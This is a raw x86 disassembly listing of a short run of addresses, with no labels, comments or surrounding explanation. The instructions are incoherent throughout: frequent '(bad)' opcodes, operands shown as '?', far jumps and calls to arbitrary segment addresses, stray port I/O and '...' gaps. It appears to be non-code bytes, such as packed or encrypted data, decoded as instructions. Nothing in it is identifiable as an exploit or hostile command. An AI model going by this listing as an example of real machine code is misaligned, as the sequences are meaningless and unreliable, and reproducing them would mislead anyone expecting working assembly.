  42aaab:	adc    al,0xc2
  42aaad:	xor    DWORD PTR [eax],0xe40a83d
  42aab3:	or     eax,0x479b4fea
  42aab8:	mov    esi,0xda18e460
  42aabd:	sub    DWORD PTR [esi-0x5bc1c54d],eax
  42aac3:	repz mov ecx,0xdfaa9147
  42aac9:	jmp    0xc1945db4
  42aace:	imul   eax,DWORD PTR [ebp-0x1b052a71],0xffffff8a
  42aad5:	popa   
  42aad6:	push   esi
  42aad7:	repnz ins BYTE PTR es:[edi],dx
  42aad9:	out    dx,eax
  42aada:	cmc    
  42aadb:	mov    ?,esi
  42aadd:	or     cl,BYTE PTR [ecx+ebx*2+0x47]
  42aae1:	(bad)  
  42aae2:	ret    
  42aae3:	dec    ebx
  42aae5:	sbb    bl,BYTE PTR [edi-0x24]
  42aae8:	mov    eax,0x8b02a552
  42aaed:	jae    0x42aae6
  42aaef:	daa    
  42aaf0:	adc    eax,0xe438bad1
  42aaf5:	iret   
  42aaf6:	aas    
  42aaf7:	push   es
  42aaf8:	dec    esi
  42aaf9:	outs   dx,BYTE PTR ds:[esi]
  42aafa:	xchg   DWORD PTR [ecx-0x34],edx
  42aafd:	sub    edi,DWORD PTR [ebx+0x76]
  42ab00:	rol    DWORD PTR [esi+0x25],0x27
  42ab04:	push   edi
  42ab05:	ins    DWORD PTR es:[edi],dx
  42ab06:	leave  
  42ab07:	pop    ss
  42ab08:	(bad)  
  42ab09:	std    
  42ab0a:	jne    0x42aa9e
  42ab0c:	and    al,0x59
  42ab0e:	test   eax,0xda5a
	...
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	xchg   edx,eax
  42ab81:	mov    ebx,0xc99ba041
  42ab86:	add    DWORD PTR [eax],eax
  42ab88:	add    eax,0x64000001
  42ab8d:	addr16 jmp 0x42ab2e
  42ab90:	je     0x42ab2f
  42ab92:	push   eax
  42ab93:	pop    ebp
  42ab94:	(bad)  
  42ab96:	ins    DWORD PTR es:[edi],dx
  42ab97:	push   ds
  42ab98:	cmc    
  42ab99:	aam    0xd6
  42ab9b:	std    
  42ab9c:	sahf   
  42ab9d:	aad    0xb7
  42ab9f:	mov    ds:0xa7dc7993,al
  42aba4:	idiv   DWORD PTR [ebx]
  42aba6:	cli    
  42aba7:	shr    bl,1
  42aba9:	mov    esi,0x95786a67
  42abae:	loopne 0x42abf9
  42abb0:	push   ecx
  42abb1:	push   esi
  42abb2:	stos   BYTE PTR es:[edi],al
  42abb3:	(bad)  
  42abb4:	mul    DWORD PTR [edi+0x4e819812]
  42abba:	add    eax,0xae159326
  42abbf:	push   edx
  42abc0:	pop    ebp
  42abc1:	imul   esi,DWORD PTR [edx],0xd17c5216
  42abc7:	push   ecx
  42abc8:	jecxz  0x42abe9
  42abca:	dec    edi
  42abcb:	mov    ecx,0x8f16dd71
  42abd0:	icebp  
  42abd1:	push   ss
  42abd2:	jle    0x42ac13
  42abd4:	jle    0x42ac14
  42abd6:	sbb    DWORD PTR [ebx-0xb],edi
  42abd9:	sbb    WORD PTR [ecx+0x4c55ad11],di
  42abe0:	call   0x5986:0xdd9db9c7
  42abe7:	sub    al,0xec
  42abe9:	mov    edi,0x303d0592
  42abee:	sub    DWORD PTR [esi-0xfb703ef],0x1e4667fc
  42abf8:	and    eax,0xefc406cb
  42abfd:	js     0x42abdb
  42abff:	repnz or bh,BYTE PTR [ebx+0x18950e40]
  42ac06:	aad    0xb4
  42ac08:	retf   
  42ac09:	and    al,0x20
  42ac0b:	enter  0x52d7,0x6a
  42ac0f:	arpl   WORD PTR [edx-0x3b],bp
  42ac12:	jmp    0x42ac1b
  42ac14:	retf   0x4b71
  42ac17:	adc    eax,0x91b3e80
  42ac1c:	imul   BYTE PTR [edi-0x79fa0bc0]
  42ac22:	sbb    al,0x74
  42ac24:	mov    gs,edx
  42ac26:	xchg   DWORD PTR [edi],edi
  42ac28:	fwait
  42ac29:	sbb    DWORD PTR [esi-0x4cd35a9],0x6cc2c1e5
  42ac33:	jecxz  0x42aca0
  42ac35:	les    ebp,FWORD PTR [edi-0x59]
  42ac38:	mov    DWORD PTR [esi],esi
  42ac3a:	test   al,dl
  42ac3c:	dec    eax
  42ac3d:	gs std 
  42ac3f:	test   al,0xe4
  42ac41:	cld    
  42ac42:	(bad)  
  42ac43:	les    esp,FWORD PTR [bp+di]
  42ac46:	pop    ds
  42ac47:	cmp    ecx,edx
  42ac49:	dec    dh
  42ac4b:	inc    ecx
  42ac4c:	sub    DWORD PTR [edi-0x24],esp
  42ac4f:	not    esi
  42ac51:	cmp    eax,0xb0ebe567
  42ac56:	repnz aam 0x73
  42ac59:	popf   
  42ac5a:	mov    ch,0x87
  42ac5c:	inc    esp
  42ac5d:	bound  ecx,QWORD PTR [ebp-0x4d]
  42ac60:	push   eax
  42ac61:	jb     0x42abf6
  42ac63:	cmp    DWORD PTR [eax+0x13],ebx
  42ac66:	loop   0x42ac73
  42ac68:	cmp    dl,BYTE PTR [edi+0x557c16ef]
  42ac6e:	out    dx,al
  42ac6f:	sbb    DWORD PTR [esi-0x37],0x40
  42ac73:	add    al,0xa2
  42ac75:	xor    ebp,DWORD PTR [eax+0x216d98b7]
  42ac7b:	in     eax,dx
  42ac7c:	sub    eax,0x10c9773a
  42ac81:	rcr    DWORD PTR [ecx],cl
  42ac83:	xor    edx,DWORD PTR [eax-0x70]
  42ac86:	jg     0x42ad03
  42ac88:	mov    eax,0x9cdb22e9
  42ac8d:	int3   
  42ac8e:	fwait
  42ac8f:	shl    BYTE PTR [edx],0x0
	...
  42acf2:	add    BYTE PTR [eax],al
  42acf4:	jmp    0xdf7cc92b
  42acf9:	ds out dx,eax
  42acfb:	repz ret 
  42acfd:	fcom   DWORD PTR [edx+0x72]
  42ad00:	mov    ecx,0xa05da79e
  42ad05:	retf   0x1
  42ad08:	add    eax,0xeb000001
  42ad0d:	out    0xe7,eax
  42ad0f:	sti    
  42ad10:	or     eax,0x533e9263
  42ad15:	lods   al,BYTE PTR ds:[esi]
  42ad16:	xor    cl,dh
  42ad18:	mov    ebx,0x167848e6
  42ad1d:	retf   
  42ad1e:	jmp    0x51de:0xa2f1cb53
  42ad25:	fs cld 
  42ad27:	sbb    eax,0x136b354b
  42ad2c:	cmp    BYTE PTR [eax],bl
  42ad2e:	(bad)  
  42ad2f:	push   ecx
  42ad30:	cmp    eax,0x27b7019d
  42ad35:	add    DWORD PTR [ebp+0x4bbc34ed],ecx
  42ad3b:	lods   eax,DWORD PTR ds:[esi]
  42ad3c:	test   al,0xcc
  42ad3e:	jle    0x42acdf
  42ad40:	inc    edx
  42ad41:	push   ds
  42ad42:	not    DWORD PTR [esi]
  42ad44:	icebp  
  42ad45:	je     0x42ad74
  42ad47:	aam    0x56
  42ad49:	retf   
  42ad4a:	fwait
  42ad4b:	mov    bh,0x99
  42ad4d:	mov    ebx,0x3e6d67d9
  42ad52:	dec    ebp
  42ad53:	cmp    bl,dl
  42ad55:	add    al,0xb2
  42ad57:	outs   dx,BYTE PTR ds:[esi]
  42ad58:	retf   0x4249
  42ad5b:	xlat   BYTE PTR ds:[ebx]
  42ad5c:	jle    0x42ad7b
  42ad5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ad5f:	mov    WORD PTR [ecx+0x7707f54f],?
  42ad65:	mov    esi,DWORD PTR [esi]
  42ad67:	clc    
  42ad68:	adc    BYTE PTR [eax-0x46],al
  42ad6b:	sti    
  42ad6c:	xlat   BYTE PTR ds:[ebx]
  42ad6d:	(bad)  
  42ad6e:	mov    esp,ds
  42ad70:	pop    ds
  42ad71:	xchg   BYTE PTR [ebp+0x5e8bd534],ch
  42ad77:	cmp    BYTE PTR ds:0xa43914e6,cl
  42ad7d:	repnz pop edi
  42ad7f:	int3   
  42ad80:	test   BYTE PTR ds:0x8b8d8262,0xfd
  42ad87:	pop    ebx
  42ad88:	test   ebp,edi
  42ad8a:	aam    0xba
  42ad8c:	jge    0x42ad7b
  42ad8e:	jp     0x42add1
  42ad90:	push   ss
  42ad91:	sub    esi,DWORD PTR [ebx-0x4c2bda5d]
  42ad97:	mov    bl,BYTE PTR ds:0xa40344b5
  42ad9d:	adc    eax,0x8c05ae3f
  42ada2:	cmp    eax,0xd509b6a2
  42ada7:	add    dl,BYTE PTR [edi]
  42ada9:	inc    eax
  42adaa:	pop    eax
  42adab:	mov    edx,0x177bcad2
  42adb0:	les    edx,FWORD PTR [eax+0x2f]
  42adb3:	push   edi
  42adb4:	pop    ebx
  42adb5:	sub    edx,ebp
  42adb7:	xor    cl,0xd0
  42adba:	add    BYTE PTR [edi-0x34],bl
  42adbd:	jl     0x42ad59
  42adbf:	push   edi
  42adc0:	dec    ebx
  42adc1:	sub    dh,ah
  42adc3:	inc    esp
  42adc4:	(bad)  
  42adc6:	call   0x7be0a983
  42adcb:	push   ebx
  42adcc:	sub    eax,esi
  42adce:	sar    DWORD PTR [ebp+0x34161af1],cl
  42add4:	imul   eax,DWORD PTR [eax+ebp*1+0x55],0x48fab93e
  42addc:	mov    ch,0x3
  42adde:	xchg   edi,eax
  42addf:	cmp    edx,eax
  42ade1:	jecxz  0x42ad70
  42ade3:	inc    ebx
  42ade4:	mov    al,0xd
  42ade6:	pop    esi
  42ade7:	fwait
  42ade8:	and    ebx,DWORD PTR [eax+0x6d]
  42adeb:	jmp    0xf1b3117c
  42adf0:	ins    DWORD PTR es:[edi],dx
  42adf1:	js     0x42ae57
  42adf3:	mov    dl,0x3d
  42adf5:	sbb    edi,DWORD PTR [edi-0x1b0cb802]
  42adfb:	cli    
  42adfc:	jecxz  0x42ae48
  42adfe:	in     al,dx
  42adff:	dec    eax
  42ae00:	jmp    0x954cba5d
  42ae05:	loope  0x42ae03
  42ae07:	icebp  
  42ae08:	call   0xc067:0x6b808e7e
  42ae0f:	mov    bh,0xfd
	...
  42ae71:	add    BYTE PTR [eax],al
  42ae73:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	mov    cl,0xe7
  42ae82:	xor    DWORD PTR [edx-0x5b],edi
  42ae85:	retf   
  42ae86:	add    DWORD PTR [eax],eax
  42ae88:	add    eax,0xbb000001
  42ae8d:	(bad)  
  42ae8e:	aas    
  42ae8f:	cmp    edi,eax
  42ae91:	nop
  42ae92:	inc    ecx
  42ae93:	xchg   ebp,eax
  42ae94:	jmp    0xd764443d
  42ae99:	or     esp,DWORD PTR [ebx+0x3a9a13ab]
  42ae9f:	loop   0x42ae6b
  42aea1:	sar    ebp,cl
  42aea3:	cmp    bl,dl
  42aea5:	mov    bl,BYTE PTR [edx-0x15758798]
  42aeab:	mov    dh,0x82
  42aead:	jmp    0x42ae66
  42aeaf:	jle    0x42ae80
  42aeb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aeb2:	mov    BYTE PTR [esp+esi*8],bl
  42aeb5:	jmp    0x4df4:0x1882c756
  42aebc:	pop    ebp
  42aebd:	sub    esi,esi
  42aebf:	mov    ds:0x295efe40,al
  42aec4:	jge    0x42ae8a
  42aec6:	mov    dl,0x4a
  42aec8:	ss mov esp,0x90d5a882
  42aece:	shr    BYTE PTR [ecx+0x92992ee],cl
  42aed4:	(bad)  
  42aed5:	push   ecx
  42aed6:	xchg   esi,eax
  42aed7:	(bad)  
  42aed8:	sbb    BYTE PTR [ebx-0x673ab598],ch
  42aede:	cmp    eax,0xc5800a9c
  42aee3:	add    DWORD PTR [ecx-0x23e0808],0xa93cb835
  42aeed:	jmp    0x174:0x604b917a
  42aef4:	xor    eax,0xe95c7276
  42aef9:	mov    bh,dh
  42aefb:	mov    ?,edx
  42aefd:	jecxz  0x42ae85
  42aeff:	add    BYTE PTR [ecx+0x79ff5edb],0xb8
  42af06:	fwait
  42af07:	pusha  
  42af08:	and    DWORD PTR [esi+0x418d0493],esi
  42af0e:	cld    
  42af0f:	add    al,0xae
  42af11:	jmp    0x500f:0x1494517d
  42af18:	jge    0x42aea3
  42af1a:	call   0xc2b611a1
  42af1f:	push   es
  42af20:	xor    al,0x7
  42af22:	mov    eax,0xf4f226c9
  42af27:	pop    esi
  42af28:	loope  0x42aed0
  42af2a:	jne    0x42af38
  42af2c:	test   BYTE PTR [ebp+0xe],0xf6
  42af30:	or     DWORD PTR ss:[eax+0x31],edi
  42af34:	test   DWORD PTR ds:0x99aefe8,esp
  42af3a:	lahf   
  42af3b:	les    ebx,FWORD PTR [ecx]
  42af3d:	mov    ah,0x63
  42af3f:	mov    ecx,0xd3911bd6
  42af44:	sbb    BYTE PTR [edi+0x232577b8],dh
  42af4a:	(bad)  
  42af4b:	retf   
  42af4c:	mov    eax,0x4b1656fa
  42af51:	rcr    BYTE PTR [ebx-0x2b],cl
  42af54:	and    esi,DWORD PTR [edx-0x65a5ec5]
  42af5a:	xor    esp,DWORD PTR [ebp+eiz*8-0x2]
  42af5e:	adc    esi,DWORD PTR [ebp-0x7503bd02]
  42af64:	sub    DWORD PTR [ebp+0x1411f8db],0xc61e13e
  42af6e:	repz fsubr DWORD PTR [ebx-0x469f5526]
  42af75:	add    BYTE PTR [esi-0x4cec151d],bl
  42af7b:	outs   dx,DWORD PTR ds:[esi]
  42af7c:	lods   eax,DWORD PTR ds:[esi]
  42af7d:	xor    eax,0x304e2380
  42af82:	bound  ecx,QWORD PTR [ebp-0x3a]
  42af85:	and    BYTE PTR [edi+0xb],bl
  42af88:	fcomp  DWORD PTR [edx]
  42af8a:	mov    ds:0x86841f79,eax
  42af8f:	retf   0xde
	...
  42aff2:	add    BYTE PTR [eax],al
  42aff4:	stc    
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	push   0xaa395d54
  42b005:	int3   
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    eax,0xce000001
  42b00d:	sub    al,0x6a
  42b00f:	daa    
  42b010:	xchg   edi,eax
  42b011:	jg     0x42b025
  42b013:	dec    esi
  42b014:	adc    eax,0x4f204e9e
  42b019:	fbstp  TBYTE PTR [ebp+0x5b3e8172]
  42b01f:	mov    WORD PTR [eax],ds
  42b021:	mov    ebp,0xb9bd1b59
  42b026:	push   cs
  42b027:	xlat   BYTE PTR ds:[ebx]
  42b028:	jnp    0x42b08a
  42b02a:	pop    edi
  42b02b:	stos   DWORD PTR es:[edi],eax
  42b02c:	rol    BYTE PTR [eax+0x7],cl
  42b02f:	pop    ds
  42b030:	lahf   
  42b031:	outs   dx,DWORD PTR ds:[esi]
  42b032:	stc    
  42b033:	jle    0x42affb
  42b035:	xchg   edi,eax
  42b036:	push   cs
  42b037:	fdivr  QWORD PTR [edi+0x65e15d1c]
  42b03d:	stos   DWORD PTR es:[edi],eax
  42b03e:	mov    al,ds:0xa953c9cc
  42b043:	dec    eax
  42b044:	and    al,BYTE PTR [ecx+0x40]
  42b047:	pop    ebp
  42b048:	push   0x77bb6d63
  42b04d:	mov    edx,DWORD PTR [ebp+ebx*4+0xa]
  42b051:	inc    esi
  42b052:	xor    edi,DWORD PTR [eax+0x53705d22]
  42b058:	add    eax,0x7f2f4442
  42b05d:	and    bl,BYTE PTR [edi+0x27147d1e]
  42b063:	xor    ebp,DWORD PTR [edx+ebx*1]
  42b066:	sbb    DWORD PTR [ebx],ebp
  42b068:	lods   al,BYTE PTR ds:[esi]
  42b069:	pusha  
  42b06a:	jmp    0x86590e5a
  42b06f:	mov    DWORD PTR [edx+ebp*4-0x60],esi
  42b073:	pop    ss
  42b074:	mov    BYTE PTR [edi-0x785971],0xe3
  42b07b:	fucomip st,st(5)
  42b07d:	jp     0x42b03a
  42b07f:	out    0x64,eax
  42b081:	outs   dx,BYTE PTR ds:[si]
  42b083:	(bad)  
  42b084:	mul    BYTE PTR [ecx-0x77]
  42b087:	(bad)  
  42b088:	out    dx,al
  42b089:	and    BYTE PTR [esi+0x6461af04],0x80
  42b090:	jb     0x42b08e
  42b092:	sbb    DWORD PTR fs:[eax+0x52],edx
  42b096:	cmp    ecx,DWORD PTR [ebp+0x4f4c8de2]
  42b09c:	int    0x2b
  42b09e:	ss inc esi
  42b0a0:	(bad)  
  42b0a1:	out    0xc9,eax
  42b0a3:	and    DWORD PTR [ebp-0x46f662b3],ebp
  42b0a9:	mov    ds:0xe6ce07b2,eax
  42b0ae:	jg     0x42b06e
  42b0b0:	sysenter 
  42b0b2:	inc    ecx
  42b0b3:	addr16 clc 
  42b0b5:	jmp    0x976cf469
  42b0ba:	xor    BYTE PTR [edi+0x6be5432d],al
  42b0c0:	push   ebx
  42b0c1:	test   DWORD PTR [eax+ecx*8],ebx
  42b0c4:	cmp    BYTE PTR [edx+0x15],cl
  42b0c7:	jmp    0x690f:0xc63825d9
  42b0ce:	xchg   DWORD PTR [ebp-0x3],esi
  42b0d1:	push   edx
  42b0d2:	or     eax,0x5de854fc
  42b0d7:	out    dx,eax
  42b0d8:	(bad)  
  42b0d9:	and    eax,DWORD PTR [esi]
  42b0db:	sub    ebx,ebp
  42b0dd:	cmp    al,0x6
  42b0df:	stc    
  42b0e0:	or     eax,edx
  42b0e2:	jl     0x42b0bb
  42b0e4:	xor    al,0x7f
  42b0e6:	inc    esi
  42b0e7:	push   DWORD PTR [ecx-0x22e5475c]
  42b0ed:	mov    ecx,DWORD PTR [esp+eax*1+0x66]
  42b0f1:	push   es
  42b0f2:	cmp    DWORD PTR [ebp+0x2eacc157],esi
  42b0f8:	or     BYTE PTR [edx],cl
  42b0fa:	pop    es
  42b0fb:	push   cs
  42b0fc:	outs   dx,DWORD PTR ds:[esi]
  42b0fd:	jl     0x42b0f7
  42b0ff:	inc    edi
  42b100:	and    eax,0x11453797
  42b105:	sbb    dh,BYTE PTR [esi]
  42b107:	shr    DWORD PTR [edx-0x74e65512],1
  42b10d:	and    eax,0xfd287b
	...
  42b172:	add    BYTE PTR [eax],al
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	inc    ebp
  42b181:	ins    BYTE PTR es:[edi],dx
  42b182:	pusha  
  42b183:	jmp    0x447f37
  42b188:	add    eax,0x42000001
  42b18d:	jns    0x42b1df
  42b18f:	fsin   
  42b191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b192:	mov    DWORD PTR [esi-0x22e1ef0],ebp
  42b198:	lea    edi,[esi]
  42b19a:	(bad)  
  42b19b:	mov    dh,0x77
  42b19d:	add    BYTE PTR ds:0x1a9ee265,ch
  42b1a3:	xchg   DWORD PTR [ebx-0x9],ebp
  42b1a6:	call   0x82ee:0xff3d1eec
  42b1ad:	sub    ebx,DWORD PTR [edx-0x63]
  42b1b0:	ja     0x42b148
  42b1b2:	dec    esp
  42b1b3:	push   edx
  42b1b4:	mov    bl,0x43
  42b1b6:	aaa    
  42b1b7:	mov    dl,0xad
  42b1b9:	jge    0x42b1db
  42b1bb:	fsubr  DWORD PTR [ecx+0x4d]
  42b1be:	and    BYTE PTR [eax-0x29],al
  42b1c1:	push   cs
  42b1c2:	xchg   ecx,eax
  42b1c3:	xlat   BYTE PTR ds:[ebx]
  42b1c4:	mov    al,ds:0x3c793b51
  42b1c9:	out    0x80,eax
  42b1cb:	(bad)
  42b1d0:	xor    DWORD PTR [eax+0x3f4fef66],edi
  42b1d6:	pushf  
  42b1d7:	sub    eax,0x42d9dc57
  42b1dc:	enter  0xccec,0xaf
  42b1e0:	xchg   DWORD PTR [edi],edx
  42b1e2:	rol    BYTE PTR [esi],1
  42b1e4:	push   cs
  42b1e5:	dec    edx
  42b1e6:	arpl   WORD PTR [ecx],dx
  42b1e8:	xchg   edi,esi
  42b1ea:	dec    ecx
  42b1eb:	scas   eax,DWORD PTR es:[edi]
  42b1ec:	jns    0x42b199
  42b1ee:	std    
  42b1ef:	and    dl,BYTE PTR [ecx]
  42b1f1:	sub    eax,0x719a9127
  42b1f6:	xor    al,0x20
  42b1f8:	inc    ecx
  42b1f9:	or     al,0x8a
  42b1fb:	sub    eax,0xf388b308
  42b200:	gs test eax,0x1f568947
  42b206:	xchg   esi,eax
  42b207:	mov    edi,0x21442c69
  42b20c:	mov    edx,0x692eb55d
  42b211:	mov    cl,0x1a
  42b213:	int3   
  42b214:	cwde   
  42b215:	ja     0x42b1e4
  42b217:	and    DWORD PTR [edx+0x10],eax
  42b21a:	push   DWORD PTR [ebx]
  42b21c:	push   ebx
  42b21d:	mov    dl,0x43
  42b21f:	dec    esi
  42b220:	loop   0x42b27e
  42b222:	popa   
  42b223:	popa   
  42b224:	int3   
  42b225:	adc    edi,DWORD PTR [edi+0x76]
  42b228:	inc    ebx
  42b229:	js     0x42b1fc
  42b22b:	adc    eax,0x214a90b9
  42b230:	pop    eax
  42b231:	jae    0x42b1d6
  42b233:	jbe    0x42b1bf
  42b235:	lahf   
  42b236:	stos   DWORD PTR es:[edi],eax
  42b237:	sbb    dh,BYTE PTR [ebp-0x78847484]
  42b23d:	lods   eax,DWORD PTR ds:[esi]
  42b23e:	dec    edx
  42b23f:	cmc    
  42b240:	jl     0x42b25b
  42b242:	jg     0x42b234
  42b244:	mov    bh,0x22
  42b246:	pop    esp
  42b247:	loope  0x42b1ff
  42b249:	rcl    DWORD PTR [edx+edi*8],1
  42b24c:	push   ebp
  42b24d:	inc    DWORD PTR [edi]
  42b24f:	int    0x2a
  42b251:	sbb    dh,BYTE PTR [edi+0x1a0c714e]
  42b257:	test   al,0x71
  42b259:	inc    esp
  42b25a:	or     edi,esp
  42b25c:	das    
  42b25d:	fnstenv [edi-0x2]
  42b260:	cmp    BYTE PTR [edi],al
  42b262:	xor    ah,al
  42b264:	int3   
  42b265:	int3   
  42b266:	retf   0xbfa5
  42b269:	push   ecx
  42b26a:	clc    
  42b26b:	in     eax,0xbf
  42b26d:	adc    eax,0x5639d04b
  42b272:	pop    edx
  42b273:	ins    BYTE PTR es:[edi],dx
  42b274:	pusha  
  42b275:	lock sub ebp,ecx
  42b278:	sbb    ebp,ebp
  42b27a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b27b:	adc    eax,0x5090849
  42b280:	arpl   WORD PTR [ebx],bx
  42b282:	or     esi,DWORD PTR [edi+ecx*2-0x786fd3e8]
  42b289:	enter  0xb09a,0x2b
  42b28d:	xchg   esp,edx
  42b28f:	sub    BYTE PTR [edx+0x0],ch
	...
  42b2f2:	add    BYTE PTR [eax],al
  42b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2f5:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b2fb:	iret   
  42b2fc:	sub    eax,0x66738e65
  42b301:	push   ebx
  42b302:	cld    
  42b303:	stos   BYTE PTR es:[edi],al
  42b304:	mov    ah,0xce
  42b306:	add    DWORD PTR [eax],eax
  42b308:	add    eax,0x17000001
  42b30d:	and    al,BYTE PTR [edx+edi*4]
  42b310:	imul   ebx,DWORD PTR [edx],0x2ebe426b
  42b316:	cwde   
  42b317:	push   ebp
  42b318:	jne    0x42b355
  42b31a:	int    0x79
  42b31c:	out    0xa0,eax
  42b31e:	fidivr DWORD PTR [edx+eiz*1+0x412a7687]
  42b325:	and    DWORD PTR [ebp+0x667edab1],edi
  42b32b:	dec    edi
  42b32c:	clc    
  42b32d:	add    ch,cl
  42b32f:	loopne 0x42b34e
  42b331:	int3   
  42b332:	repnz sbb ebp,ebx
  42b335:	cdq    
  42b336:	retf   
  42b337:	inc    esi
  42b338:	jl     0x42b361
  42b33a:	das    
  42b33b:	mov    esi,0x37c8c619
  42b340:	and    eax,0xa54f4af6
  42b345:	push   0x7fd1b6de
  42b34a:	mov    esi,0xf14e3554
  42b34f:	stos   DWORD PTR es:[edi],eax
  42b350:	test   BYTE PTR [ebx+0x1fb86f4f],dl
  42b356:	ror    BYTE PTR [esi],1
  42b358:	xchg   esi,eax
  42b359:	adc    DWORD PTR [ebx+edi*2-0x3dc490a2],ecx
  42b360:	or     DWORD PTR [ecx+0x39],esi
  42b363:	add    BYTE PTR [bx+si],bl
  42b366:	jl     0x42b35e
  42b368:	imul   esi,DWORD PTR [eax-0x48685a68],0x19262d9f
  42b372:	mov    bl,ch
  42b374:	jecxz  0x42b31d
  42b376:	add    edi,DWORD PTR [edx+ebp*4]
  42b379:	aad    0x83
  42b37b:	xor    DWORD PTR ds:0xa0366aca,0x78
  42b382:	js     0x42b336
  42b384:	mov    dh,0xe
  42b386:	les    esi,FWORD PTR [ecx]
  42b388:	daa    
  42b389:	xor    ebp,DWORD PTR [edi+ecx*4]
  42b38c:	dec    edi
  42b38d:	repz jb 0x42b3f3
  42b390:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b391:	mov    DWORD PTR [esi-0x34fcf9cd],esi
  42b397:	inc    esi
  42b398:	shr    dh,1
  42b39a:	mov    ds:0xe7d2f83c,eax
  42b39f:	add    cl,BYTE PTR [edx-0x226e5c85]
  42b3a5:	mov    esi,0xc8b26e45
  42b3aa:	inc    ecx
  42b3ab:	xchg   esp,eax
  42b3ac:	(bad)  
  42b3af:	loop   0x42b377
  42b3b1:	sub    eax,0x81fcbc37
  42b3b6:	in     al,dx
  42b3b7:	sbb    al,0x36
  42b3b9:	dec    esi
  42b3ba:	stos   BYTE PTR es:[edi],al
  42b3bb:	icebp  
  42b3bc:	inc    ebx
  42b3bd:	stos   DWORD PTR es:[edi],eax
  42b3be:	cmc    
  42b3bf:	lahf   
  42b3c0:	sbb    al,0x4e
  42b3c2:	popa   
  42b3c3:	in     eax,0x35
  42b3c5:	iret   
  42b3c6:	dec    ebx
  42b3c7:	je     0x42b369
  42b3c9:	jns    0x42b3ac
  42b3cb:	add    al,0x5e
  42b3cd:	add    eax,0xd4038a74
  42b3d2:	or     eax,0x2c8d0138
  42b3d7:	or     BYTE PTR [ebp+0x23],0x42
  42b3db:	xchg   ebp,eax
  42b3dc:	mov    eax,0x4a691777
  42b3e1:	ja     0x42b3dc
  42b3e3:	shl    BYTE PTR [ebx],1
  42b3e5:	mov    eax,0x386bba20
  42b3ea:	pop    ss
  42b3eb:	hlt    
  42b3ec:	xchg   esi,eax
  42b3ed:	sbb    DWORD PTR [ebp+0x20],ecx
  42b3f0:	pusha  
  42b3f1:	cli    
  42b3f2:	cmp    ah,BYTE PTR [ecx+edi*1-0x3514a493]
  42b3f9:	fmul   DWORD PTR [esi+0x74]
  42b3fc:	test   BYTE PTR [edi+0x69cf5163],ah
  42b402:	jae    0x42b464
  42b404:	ds sbb cl,bl
  42b407:	stc    
  42b408:	(bad)  
  42b409:	(bad)  
  42b40a:	mov    bl,0x50
  42b40c:	ficomp WORD PTR [esi+0x8f2382]
	...
  42b472:	add    BYTE PTR [eax],al
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [edi],edx
  42b481:	nop
  42b482:	(bad)  
  42b483:	adc    eax,0x1cfb9
  42b488:	add    eax,0x5b000001
  42b48d:	sbb    dh,BYTE PTR [eax-0x53]
  42b490:	and    edi,DWORD PTR [edi-0x551663f]
  42b496:	xchg   ebp,eax
  42b497:	cdq    
  42b498:	push   es
  42b499:	adc    DWORD PTR [edi],0xffffffca
  42b49c:	imul   ebp,DWORD PTR [ebx],0xb1e04052
  42b4a2:	aaa    
  42b4a3:	jmp    0x32d480d
  42b4a8:	adc    BYTE PTR [ecx-0x7e],bh
  42b4ab:	jno    0x42b4fb
  42b4ad:	push   cs
  42b4ae:	bound  esp,QWORD PTR [ebx+0x443ca95c]
  42b4b4:	mov    bh,0x32
  42b4b6:	fld    QWORD PTR [edx-0x6705baf6]
  42b4bc:	std    
  42b4bd:	mov    esp,0x839eebf5
  42b4c2:	dec    BYTE PTR [edx+esi*1-0x2cf2cec1]
  42b4c9:	jae    0x42b4a5
  42b4cb:	icebp  
  42b4cc:	inc    esp
  42b4cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b4ce:	mov    WORD PTR [ebp+0x43],gs
  42b4d1:	pop    eax
  42b4d2:	jl     0x42b4a8
  42b4d4:	xlat   BYTE PTR ds:[ebx]
  42b4d5:	xchg   BYTE PTR [esi],al
  42b4d7:	mov    ds,WORD PTR [eax-0x4859c094]
  42b4dd:	cmc    
  42b4de:	adc    dl,BYTE PTR ss:[ebp-0x37]
  42b4e2:	mov    WORD PTR [eax+0x5d],?
  42b4e5:	mov    ch,0x74
  42b4e7:	jne    0x42b46c
  42b4e9:	and    cl,BYTE PTR [esi]
  42b4eb:	dec    edi
  42b4ec:	ret    0x176e
  42b4ef:	jo     0x42b4d2
  42b4f1:	sbb    al,0xa1
  42b4f3:	cmp    al,BYTE PTR ds:0xd003b1c8
  42b4f9:	ret    
  42b4fa:	or     eax,0xd78b31c9
  42b4ff:	jnp    0x42b4ba
  42b501:	ret    
  42b502:	dec    edi
  42b503:	xor    al,0xdf
  42b505:	mov    gs,ebx
  42b507:	ja     0x42b508
  42b509:	jo     0x42b4af
  42b50b:	cmp    eax,DWORD PTR [ebp-0x28287275]
  42b511:	jmp    0x42b517
  42b513:	scas   al,BYTE PTR es:[edi]
  42b514:	xchg   DWORD PTR [esi],edi
  42b516:	cmp    DWORD PTR [edi],ecx
  42b518:	pushf  
